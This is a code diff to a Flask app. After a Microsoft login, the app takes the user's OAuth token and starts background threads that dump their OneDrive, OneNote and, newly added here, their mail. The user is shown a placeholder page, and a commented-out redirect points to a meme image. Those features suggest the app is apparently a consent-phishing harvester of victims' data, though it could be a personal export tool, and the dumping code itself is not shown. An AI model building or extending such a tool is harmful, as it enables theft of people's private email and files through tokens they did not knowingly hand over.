@@ -2,6 +2,7 @@ from flask              import Flask, redirect, render_template, request, sessio
 from flask_session      import Session
 from extractor.onenote  import dump_onenote
 from extractor.onedrive import dump_onedrive
+from extractor.mail     import dump_mail
 from threading          import Thread
 
 import identity
@@ -85,6 +86,17 @@ def onedrive():
 
     return render_template('tkt.html')
 
+@app.route("/mail")
+def mail():
+    token = auth.get_token_for_user(app_config.SCOPE)
+    if "error" in token:
+        return redirect(url_for("login"))
+    
+    #dump_mail(token['access_token'], auth.get_user().get("preferred_username"))
+    Thread(target=dump_mail, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+
+    return render_template('tkt.html')
+
 @app.route("/oneall")
 def oneall():
     token = auth.get_token_for_user(app_config.SCOPE)
@@ -92,7 +104,8 @@ def oneall():
         return redirect(url_for("login"))
     
     Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
-    Thread(target=dump_onenote, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+    Thread(target=dump_onenote , args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
+    Thread(target=dump_mail    , args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
 
     return render_template('tkt.html') #redirect("https://preview.redd.it/xl32gp9rrmt01.jpg?auto=webp&s=4678d4eec316ad160a1d258abe98230152f24122")
 
